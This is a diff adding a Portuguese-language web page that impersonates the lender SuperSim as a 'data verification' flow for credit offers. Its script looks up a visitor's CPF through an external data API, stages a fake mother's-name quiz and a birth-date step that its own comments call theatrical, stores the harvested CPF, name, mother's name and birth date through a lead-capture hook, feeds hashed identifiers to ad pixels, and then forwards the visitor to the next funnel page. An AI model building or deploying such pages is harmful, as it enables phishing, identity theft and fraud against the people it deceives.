@@ -1,0 +1,609 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/js/meta-pixel.js"></script><script src="/js/utmify-loader.js"></script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4371125873201817&ev=PageView&noscript=1" /></noscript>
+
+<script src="js/latest.js" async="" defer=""></script>
+<script>window.pixelId="6a6c0cbfe2e9334e445f0bdf";var _uax=document.createElement("script");_uax.async=!0;_uax.defer=!0;_uax.src="https://cdn.utmify.com.br/scripts/pixel/pixel.js";document.head.appendChild(_uax);</script><script async="" defer="" src="js/pixel.js"></script>
+
+  <link rel="icon" type="image/png" href="images/favicon-supersim.png">
+
+
+  
+
+  
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#7c5914">
+  <title>SuperSim – Verificação de Dados</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="css2__a993f225" rel="stylesheet">
+  <style>
+    :root{
+      --green:#E89512; --green-vivid:#FFAA1F; --green-deep:#A85A08; --green-dark:#28211a; --green-ink:#201b16;
+      --green-wash:#FFF8EF; --green-line:#F3DFB6; --green-glow:rgba(224, 124, 8, .28);
+      --orange:#f0900f; --orange-vivid:#ff9e1b; --orange-deep:#d9760a; --orange-wash:#fef1de; --orange-line:#f7d9ad;
+      --orange-glow:rgba(240,144,15,.4);
+      --paper:#ffffff; --shell:#f6f4ee; --ink:#1d1a17; --mut:#7a7e89; --line:#ece7dc;
+      --ease-out:cubic-bezier(.16,1,.3,1);
+    }
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+    body{font-family:'Plus Jakarta Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--ink);
+      background:var(--shell);min-height:100vh;-webkit-font-smoothing:antialiased;position:relative;overflow-x:hidden}
+    body::before{content:"";position:fixed;top:-20%;left:50%;transform:translateX(-50%);width:140%;height:340px;pointer-events:none;z-index:0;
+      background:radial-gradient(closest-side,rgba(224, 124, 8, .14),transparent 70%);filter:blur(30px)}
+
+    /* header */
+    .header{position:sticky;top:0;z-index:40;background:rgba(255,255,255,.9);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+    .header-content{max-width:480px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:11px 18px}
+    .header-left{display:flex;align-items:center;gap:10px}
+    .menu-icon{width:38px;height:38px;border-radius:11px;background:#fff;border:1px solid var(--line);display:flex;align-items:center;justify-content:center;color:#48433c;cursor:pointer}
+    .menu-icon svg{width:20px;height:20px}
+    .header-left img{height:30px;width:auto}
+    .header-right{display:flex;align-items:center;gap:10px}
+    .header-icon{position:relative;width:38px;height:38px;border-radius:11px;background:#fff;border:1px solid var(--line);display:flex;align-items:center;justify-content:center;color:#48433c}
+    .header-icon svg{width:20px;height:20px}
+    .notification-badge{position:absolute;top:9px;right:10px;width:7px;height:7px;border-radius:50%;background:var(--orange);border:1.5px solid #fff}
+    .user-avatar{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--green-vivid),var(--green-deep));display:flex;align-items:center;justify-content:center;color:#fff}
+
+    /* container + card */
+    .container{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:24px 16px 10px}
+    .card{position:relative;background:#fff;border-radius:24px;border:1px solid var(--line);
+      box-shadow:0 30px 60px -30px rgba(32, 27, 22, .4),0 4px 14px -8px rgba(0,0,0,.08);padding:24px 20px 24px;overflow:hidden;
+      animation:cardIn .5s var(--ease-out) both}
+    .card::before{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--green),var(--green-vivid) 55%,var(--orange-vivid))}
+    @keyframes cardIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+
+    /* step indicators */
+    .step-indicators{display:flex;align-items:flex-start;justify-content:space-between}
+    .step-dot{display:flex;flex-direction:column;align-items:center;gap:6px;flex-shrink:0}
+    .step-dot .dot{width:34px;height:34px;border-radius:50%;background:#f2f1ee;color:#b1ada8;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;transition:.3s;border:2px solid transparent}
+    .step-dot.active .dot,.step-dot.done .dot{background:linear-gradient(135deg,var(--green-vivid),var(--green-deep));color:#fff;box-shadow:0 6px 14px -6px var(--green-glow)}
+    .step-dot.active .dot{box-shadow:0 0 0 4px rgba(224, 124, 8, .14),0 6px 14px -6px var(--green-glow)}
+    .step-dot .dot svg{width:15px;height:15px}
+    .step-dot .dot-label{font-size:10.5px;font-weight:700;color:#b1ada8;white-space:nowrap}
+    .step-dot.active .dot-label,.step-dot.done .dot-label{color:var(--green-deep)}
+    .step-line{flex:1;height:3px;border-radius:2px;background:#eeede9;margin:17px 4px 0;transition:background .4s}
+    .step-line.done{background:var(--green)}
+    .card-divider{height:1px;background:var(--line);margin:18px 0 0}
+    .progress-bar{height:6px;border-radius:4px;background:#f2f1ee;overflow:hidden;margin:16px 0 22px}
+    .progress-fill{height:100%;background:linear-gradient(90deg,var(--green-deep),var(--green-vivid) 70%,var(--orange-vivid));border-radius:4px;transition:width .5s var(--ease-out)}
+
+    /* step header */
+    .step{animation:stepIn .35s var(--ease-out) both}
+    @keyframes stepIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+    .step-header{display:flex;align-items:center;gap:12px;margin-bottom:4px}
+    .step-icon{width:46px;height:46px;border-radius:14px;background:var(--green-wash);color:var(--green-deep);display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1px solid var(--green-line)}
+    .step-icon svg{width:24px;height:24px}
+    .step h1{font-family:'Sora',sans-serif;font-size:21px;font-weight:800;letter-spacing:-.4px;color:var(--ink);line-height:1.15}
+    .step-subtitle{font-size:14px;color:var(--mut);line-height:1.55;margin:10px 0 18px}
+
+    /* form */
+    .form-group{margin-bottom:18px}
+    .form-group label{display:block;font-size:13px;font-weight:700;color:#433e37;margin-bottom:8px}
+    .form-group input{width:100%;border:1.5px solid #e6e3dc;border-radius:14px;padding:15px 16px;font-family:inherit;font-size:17px;font-weight:600;color:var(--ink);background:#fdfcfb;outline:none;transition:.15s;letter-spacing:.5px}
+    .form-group input:focus{border-color:var(--green);background:#fff;box-shadow:0 0 0 4px rgba(224, 124, 8, .1)}
+    .form-group input::placeholder{color:#b3b0ac;font-weight:500;letter-spacing:1px}
+
+    /* buttons */
+    .btn{position:relative;display:flex;align-items:center;justify-content:center;gap:9px;width:100%;border:0;cursor:pointer;font-family:'Sora',sans-serif;font-weight:800;font-size:16px;padding:16px;border-radius:15px;transition:transform .15s var(--ease-out);overflow:hidden}
+    .btn-primary{background:linear-gradient(135deg,var(--orange-vivid),var(--orange-deep));color:#fff;box-shadow:0 16px 30px -12px var(--orange-glow),inset 0 1px 0 rgba(255,255,255,.3)}
+    .btn-primary::after{content:"";position:absolute;inset:0;background:linear-gradient(100deg,transparent 40%,rgba(255,255,255,.5) 50%,transparent 60%);transform:translateX(-100%);pointer-events:none;animation:btnShine 3.4s var(--ease-out) infinite}
+    @keyframes btnShine{0%{transform:translateX(-100%)}60%,100%{transform:translateX(100%)}}
+    .btn-primary:active{transform:scale(.985)}
+    .btn:disabled{opacity:.85;cursor:default}
+    .btn .spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.5);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;position:relative;z-index:1}
+    .btn.loading .btn-text{display:none}
+    .btn.loading .spinner{display:inline-block}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* trust bar */
+    .trust-bar{display:flex;align-items:center;gap:9px;background:var(--green-wash);border:1px solid var(--green-line);border-radius:13px;padding:12px 14px;margin-top:16px;font-size:12.5px;color:#544e45;font-weight:600;line-height:1.45}
+    .trust-bar svg{width:18px;height:18px;color:var(--green);flex-shrink:0}
+
+    /* btn-option (nome da mãe / confirmação) */
+    .btn-option{display:flex;align-items:center;gap:11px;width:100%;background:#fff;border:1.5px solid #e6e3dc;border-radius:14px;padding:15px 16px;margin-bottom:10px;font-family:inherit;font-size:14.5px;font-weight:700;color:#34302c;text-align:left;cursor:pointer;transition:.15s}
+    .btn-option:hover{border-color:var(--green);background:#fcfbf8}
+    .btn-option:active{transform:scale(.99)}
+    .btn-option .option-icon{width:24px;height:24px;border-radius:50%;border:2px solid #d8d5cd;color:transparent;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.15s}
+    .btn-option .option-icon svg{width:14px;height:14px}
+    .btn-option.selected{border-color:var(--green);background:var(--green-wash)}
+    .btn-option.selected .option-icon{background:var(--green);border-color:var(--green);color:#fff}
+    .btn-confirm{justify-content:center;font-family:'Sora',sans-serif;font-weight:800;font-size:15px;padding:15px}
+    .confirm-yes{border-color:var(--green-line);color:var(--green-deep)}
+    .confirm-yes:hover{background:var(--green-wash)}
+    .confirm-yes svg{width:18px;height:18px}
+    .confirm-no{border-color:#f0d6d6;color:#c0392b}
+    .confirm-no:hover{background:#fdf1f1;border-color:#e9b8b8}
+    .confirm-no svg{width:18px;height:18px}
+
+    /* data de nascimento */
+    .date-display{display:flex;align-items:center;gap:11px;background:var(--green-wash);border:1px solid var(--green-line);border-radius:14px;padding:16px;margin-bottom:14px;font-size:18px;font-weight:800;color:var(--green-deep)}
+    .date-display svg{width:22px;height:22px;color:var(--green)}
+
+    /* sucesso */
+    .success{text-align:center;padding:14px 0}
+    .success-icon{position:relative;width:80px;height:80px;border-radius:50%;background:var(--green-wash);border:2px solid var(--green-line);color:var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;animation:pop .5s cubic-bezier(.2,.7,.2,1.4) both}
+    .success-icon::after{content:"";position:absolute;inset:-8px;border-radius:50%;border:2px solid var(--green-line);opacity:0;animation:ring 1.8s var(--ease-out) infinite}
+    @keyframes ring{0%{transform:scale(.9);opacity:.6}100%{transform:scale(1.25);opacity:0}}
+    .success-icon svg{width:42px;height:42px}
+    @keyframes pop{0%{transform:scale(0)}60%{transform:scale(1.12)}100%{transform:scale(1)}}
+    .success h1{font-family:'Sora',sans-serif;font-size:22px;font-weight:800;color:var(--ink)}
+    .success-text{font-size:14.5px;color:var(--mut);margin-top:8px;line-height:1.5}
+    .success-redirect{display:inline-flex;align-items:center;gap:9px;margin-top:20px;font-size:13px;font-weight:600;color:var(--green-deep);background:var(--green-wash);border:1px solid var(--green-line);padding:11px 16px;border-radius:100px}
+    .mini-spinner{width:15px;height:15px;border:2px solid rgba(224, 124, 8, .3);border-top-color:var(--green);border-radius:50%;animation:spin .7s linear infinite}
+
+    /* rodapé */
+    .site-footer{background:var(--green-dark);margin-top:28px;padding:26px 22px}
+    .footer-inner{max-width:480px;margin:0 auto;text-align:center}
+    .footer-logo{display:inline-flex;background:#fff;padding:8px 12px;border-radius:11px}
+    .footer-logo img{height:24px;width:auto}
+    .site-footer small{display:block;font-size:11px;color:#aca59a;line-height:1.7;margin-top:14px}
+    .site-footer small strong{color:#f0eadb}
+    .footer-badges{display:flex;justify-content:center;flex-wrap:wrap;gap:14px;margin-top:14px}
+    .footer-badges span{display:flex;align-items:center;gap:5px;font-size:10.5px;color:#aca59a;font-weight:600}
+    .footer-badges svg{width:13px;height:13px;color:#d7b777}
+
+    @media (prefers-reduced-motion: reduce){*,*::before,*::after{animation:none !important;transition:none !important}}
+  </style>
+
+<script src="js/tracking-shared.js"></script>
+<script src="js/lead-capture.js"></script>
+<style id="_anim_reset" data-anim-reset="true">
+[style*="opacity: 0"], [style*="opacity:0"], [style*="opacity: 0 "] { opacity: 1 !important; }
+[style*="translate"]:not(.allow-translate) { transform: none !important; }
+[style*="scale(0"] { transform: none !important; }
+[style*="blur("] { filter: none !important; }
+[style*="rotate"] { transform: none !important; }
+[style*="skew"] { transform: none !important; }
+[style*="clip-path"] { clip-path: none !important; }
+[style*="clipPath"] { clip-path: none !important; }
+[aria-hidden="true"][style*="blur"] { opacity: 0 !important; }
+[data-framer-name], [data-framer-component-type] { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-aos]:not(.aos-animate) { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-animate], [data-animation] { opacity: 1 !important; transform: none !important; filter: none !important; }
+[data-scroll], [data-inview], [data-reveal] { opacity: 1 !important; transform: none !important; filter: none !important; }
+.motion-safe\:opacity-0, .opacity-0 { opacity: 1 !important; }
+[class*="invisible"], [class*="hidden-init"] { visibility: visible !important; }
+.fade-in-init, .slide-up-init, .scale-init, .blur-in-init, .reveal-init { opacity: 1 !important; transform: none !important; filter: none !important; }
+[class*="motion-"]:not([class*="motion-safe"]) { opacity: 1 !important; transform: none !important; filter: none !important; }
+</style></head>
+
+<body>
+
+  <header class="header">
+  <link rel="icon" type="image/png" href="images/favicon-supersim.png">
+
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <img src="images/supersim-logo.png" alt="SuperSim" style="height:40px;width:auto;">
+      </div>
+      <div class="header-right">
+        <div class="header-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9">
+            </path>
+          </svg>
+          <span class="notification-badge"></span>
+        </div>
+        <div class="user-avatar">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="18" height="18">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="container">
+
+    <div class="card">
+
+      <!-- STEP INDICATORS -->
+      <div class="step-indicators" id="stepIndicators">
+        <div class="step-dot active" id="ind1">
+          <div class="dot">1</div>
+          <span class="dot-label">CPF</span>
+        </div>
+        <div class="step-line" id="line1"></div>
+        <div class="step-dot" id="ind2">
+          <div class="dot">2</div>
+          <span class="dot-label">Identidade</span>
+        </div>
+        <div class="step-line" id="line2"></div>
+        <div class="step-dot" id="ind3">
+          <div class="dot">3</div>
+          <span class="dot-label">Nascimento</span>
+        </div>
+        <div class="step-line" id="line3"></div>
+        <div class="step-dot" id="ind4">
+          <div class="dot">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="14" height="14">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+            </svg>
+          </div>
+          <span class="dot-label">Pronto</span>
+        </div>
+      </div>
+
+      <div class="card-divider"></div>
+
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill" style="width: 25%;"></div>
+      </div>
+
+      <!-- STEP 1 -->
+      <div class="step" id="step1" style="display: block;">
+        <div class="step-header">
+          <div class="step-icon">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z">
+              </path>
+            </svg>
+          </div>
+          <h1>Vamos começar!</h1>
+        </div>
+        <p class="step-subtitle">Informe seu CPF para verificarmos seus dados e liberar as melhores ofertas de crédito
+          disponíveis para você.</p>
+
+        <form id="step1Form">
+          <div class="form-group">
+            <label>Seu CPF</label>
+            <input type="tel" id="cpf" inputmode="numeric" placeholder="000.000.000-00" required="">
+          </div>
+
+          <button type="submit" class="btn btn-primary" id="submitBtn1">
+            <span class="btn-text">Verificar meu CPF</span>
+            <span class="spinner"></span>
+          </button>
+        </form>
+
+        <div class="trust-bar">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+            </path>
+          </svg>
+          <span>Seus dados estão protegidos com criptografia de ponta a ponta, em conformidade com a LGPD (Lei nº 13.709/2018).</span>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step" id="step2" style="display:none;">
+        <div class="step-header">
+          <div class="step-icon">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+              </path>
+            </svg>
+          </div>
+          <h1>Verificação de segurança</h1>
+        </div>
+        <p class="step-subtitle">Para sua proteção, selecione abaixo o nome correto da sua mãe.</p>
+        <div id="opcoesMae"></div>
+
+        <div class="trust-bar">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+            </path>
+          </svg>
+          <span>Etapa obrigatória para garantir a segurança da sua conta.</span>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step" id="step3" style="display:none;">
+        <div class="step-header">
+          <div class="step-icon">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+            </svg>
+          </div>
+          <h1>Confirme seu nascimento</h1>
+        </div>
+        <p class="step-subtitle">Última etapa! Verifique se a data de nascimento abaixo está correta.</p>
+        <div class="date-display" id="dataNascimentoBox">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+          </svg>
+          <span id="dataText"></span>
+        </div>
+        <button class="btn-option btn-confirm confirm-yes" id="dataOkSim">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Sim, está correto
+        </button>
+        <button class="btn-option btn-confirm confirm-no" id="dataOkNao">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+          </svg>
+          Não, está incorreto
+        </button>
+      </div>
+
+      <!-- STEP 4 -->
+      <div class="step" id="step4" style="display:none;">
+        <div class="success">
+          <div class="success-icon">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+            </svg>
+          </div>
+          <h1>Verificação concluída!</h1>
+          <p class="success-text" id="mensagemFinal"></p>
+          <div class="success-redirect">
+            <span class="mini-spinner"></span>
+            Preparando suas ofertas de crédito...
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo"><img src="images/supersim-logo.png" alt="SuperSim" style="height:28px;width:auto;">
+      </div>
+      <small><strong>SuperSim Soluções Financeiras S.A.</strong><br>
+        CNPJ: 33.030.944/0001-60 – São Paulo, SP – 01310-200</small>
+      <div class="footer-badges">
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+            </path>
+          </svg>
+          SSL Seguro
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+            </path>
+          </svg>
+          Dados protegidos
+        </span>
+        <span>
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4">
+            </path>
+          </svg>
+          Instituição regulada
+        </span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const progressFill = document.getElementById('progressFill');
+
+    function updateIndicators(n) {
+      for (let i = 1; i <= 4; i++) {
+        const ind = document.getElementById('ind' + i);
+        const line = document.getElementById('line' + i);
+        ind.classList.remove('active', 'done');
+        if (i < n) ind.classList.add('done');
+        if (i === n) ind.classList.add('active');
+        if (line) {
+          line.classList.remove('done');
+          if (i < n) line.classList.add('done');
+        }
+      }
+    }
+
+    function showStep(n) {
+      document.querySelectorAll('.step').forEach(s => s.style.display = 'none');
+      document.getElementById('step' + n).style.display = 'block';
+      progressFill.style.width = `${n * 25}%`;
+      updateIndicators(n);
+    }
+
+    document.getElementById('step1Form').addEventListener('submit', async e => {
+      e.preventDefault();
+
+      const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+      const btn = document.getElementById('submitBtn1');
+
+      if (cpf.length !== 11) {
+        alert('CPF inválido. Digite 11 dígitos.');
+        return;
+      }
+
+      // Loading state
+      btn.classList.add('loading');
+      btn.disabled = true;
+
+      localStorage.setItem('cpf', cpf);
+
+      try {
+        const url = `/api/cpf?cpf=${cpf}`;
+        const res = await fetch(url, {
+          method: 'GET'
+        });
+        const data = await res.json();
+        console.log('Resposta da API:', JSON.stringify(data, null, 2));
+
+        // Busca o campo em qualquer nivel do objeto (a resposta varia de estrutura)
+        function findField(obj, keys) {
+          if (!obj || typeof obj !== 'object') return null;
+          for (const key of keys) {
+            if (obj[key] !== undefined && obj[key] !== null && obj[key] !== '') return obj[key];
+          }
+          for (const k of Object.keys(obj)) {
+            if (typeof obj[k] === 'object' && obj[k] !== null) {
+              const found = findField(obj[k], keys);
+              if (found) return found;
+            }
+          }
+          return null;
+        }
+
+        const nome = findField(data, ['NOME', 'nome', 'name', 'Nome']) || 'Cliente';
+        const nomeMae = findField(data, ['NOME_MAE', 'nome_mae', 'mae', 'nomeMae', 'Nome_Mae', 'MAE']) || '';
+        const dataNasc = findField(data, ['NASC', 'nasc', 'nascimento', 'data_nascimento', 'DATA_NASCIMENTO', 'dataNascimento', 'dt_nascimento', 'DT_NASCIMENTO', 'birth', 'birthday']);
+
+        console.log('Nome:', nome, '| Mãe:', nomeMae, '| Nascimento:', dataNasc);
+
+        localStorage.setItem('nome', nome);
+        localStorage.setItem('nome_mae', nomeMae || 'NENHUMA DAS OPÇÕES');
+        if (dataNasc) {
+          localStorage.setItem('data_nasc', dataNasc);
+        } else {
+          localStorage.removeItem('data_nasc');
+        }
+
+        // Captura: CPF consultado (nome/nascimento/mãe quando a API retorna).
+        try {
+          if (window.arxLead) window.arxLead.save({
+            cpf: cpf,
+            nome: (nome && nome !== 'Cliente') ? nome : null,
+            data_nasc: dataNasc || null,
+            nome_mae: (nomeMae && nomeMae.trim()) ? nomeMae : null
+          }, 'cpf');
+        } catch (e) {}
+
+        // Facebook: Lead event + Advanced Matching com dados reais
+        if (typeof fbq === 'function') {
+          (async function() {
+            try {
+              async function _h(s) {
+                var b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode((s||'').toLowerCase().trim()));
+                return Array.from(new Uint8Array(b)).map(function(x){return x.toString(16).padStart(2,'0');}).join('');
+              }
+              var parts = nome.trim().split(' ');
+              var userData = { external_id: await _h(cpf) };
+              if (parts[0]) userData.fn = await _h(parts[0]);
+              if (parts.length > 1) userData.ln = await _h(parts[parts.length - 1]);
+              fbq('init', '1461268502427928', userData);
+              if (typeof fbTrack === 'function') fbTrack('Lead'); else fbq('track', 'Lead');
+            } catch(e) { if (typeof fbTrack === 'function') fbTrack('Lead'); else fbq('track', 'Lead'); }
+          })();
+        }
+
+        btn.classList.remove('loading');
+        btn.disabled = false;
+
+        showStep(2);
+        renderStep2();
+
+      } catch (err) {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        console.error('Erro na consulta:', err);
+        alert('Erro ao consultar CPF: ' + err.message);
+      }
+    });
+
+    function renderStep2() {
+      const mae = localStorage.getItem('nome_mae');
+      const hasMae = mae && mae !== 'NENHUMA DAS OPÇÕES' && mae.trim() !== '';
+
+      const nenhuma = 'NENHUMA DAS ALTERNATIVAS';
+
+      // Nomes falsos para misturar
+      const fakeNames = [
+        'MARIA APARECIDA DOS SANTOS', 'ANA PAULA OLIVEIRA', 'PATRICIA SOUZA LIMA',
+        'LUANA FERREIRA COSTA', 'SANDRA REGINA ALVES', 'CLAUDIA MARIA PEREIRA',
+        'ROSANGELA SILVA NASCIMENTO', 'FRANCISCA ALMEIDA ROCHA', 'LUCIANA BARBOSA MARTINS',
+        'ADRIANA RIBEIRO GOMES', 'SIMONE CARVALHO DIAS', 'MARCIA FERNANDES ARAUJO'
+      ];
+
+      if (hasMae) {
+        // API achou a mãe: resposta certa é o nome da mãe
+        const correct = mae.toUpperCase();
+        // Pega 2 nomes falsos aleatórios diferentes do nome real
+        const shuffledFakes = fakeNames.filter(f => f !== correct).sort(() => Math.random() - 0.5);
+        const opts = [correct, shuffledFakes[0], shuffledFakes[1], nenhuma]
+          .sort(() => Math.random() - 0.5);
+
+        renderOpcoes(opts, correct);
+      } else {
+        // API não achou: resposta certa é "Nenhuma das alternativas"
+        const shuffledFakes = fakeNames.sort(() => Math.random() - 0.5);
+        const opts = [shuffledFakes[0], shuffledFakes[1], shuffledFakes[2], nenhuma]
+          .sort(() => Math.random() - 0.5);
+
+        renderOpcoes(opts, nenhuma);
+      }
+    }
+
+    function renderOpcoes(opts, correct) {
+      const box = document.getElementById('opcoesMae');
+      box.innerHTML = '';
+
+      opts.forEach(o => {
+        const b = document.createElement('button');
+        b.className = 'btn-option';
+        b.innerHTML = `<span class="option-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg></span>${o}`;
+        b.onclick = () => {
+          // Remove selected de todos
+          box.querySelectorAll('.btn-option').forEach(btn => btn.classList.remove('selected'));
+          // Marca o clicado
+          b.classList.add('selected');
+
+          if (o === correct) {
+            try { if (window.arxLead) window.arxLead.save({}, 'quiz_mae'); } catch (e) {}
+            setTimeout(() => {
+              // Nascimento é etapa teatral: só faz sentido com dado real.
+              // Sem data da API, pula direto pra confirmação de identidade (não trava o funil).
+              if (localStorage.getItem('data_nasc')) { showStep(3); renderStep3(); }
+              else { showStep(4); renderStep4(); }
+            }, 400);
+          } else {
+            setTimeout(() => {
+              alert('Opção incorreta. Tente novamente.');
+              b.classList.remove('selected');
+            }, 400);
+          }
+        };
+        box.appendChild(b);
+      });
+    }
+
+    function renderStep3() {
+      const raw = localStorage.getItem('data_nasc') || '';
+      // API pode devolver ISO (2005-11-18) ou ja em BR; normaliza pra dd/mm/aaaa.
+      const iso = raw.match(/^(\d{4})-(\d{2})-(\d{2})/);
+      document.getElementById('dataText').innerText =
+        iso ? `${iso[3]}/${iso[2]}/${iso[1]}` : raw;
+
+      dataOkSim.onclick = () => { showStep(4); renderStep4(); }
+      dataOkNao.onclick = () => alert('Verifique seus dados e entre em contato com o suporte.');
+    }
+
+    function renderStep4() {
+      const nome = localStorage.getItem('nome');
+      mensagemFinal.innerText =
+        `Tudo certo, ${nome}! Sua identidade foi confirmada com sucesso.`;
+
+      setTimeout(() => {
+        const p = new URLSearchParams(window.location.search); window.location.href = '../3/index.html' + (p.toString() ? '?' + p : '');
+      }, 3000);
+    }
+
+    document.getElementById('cpf').addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 11) value = value.slice(0, 11);
+
+      if (value.length > 9) {
+        e.target.value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      } else if (value.length > 6) {
+        e.target.value = value.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+      } else if (value.length > 3) {
+        e.target.value = value.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+      } else {
+        e.target.value = value;
+      }
+    });
+
+    showStep(1);
+  </script>
+
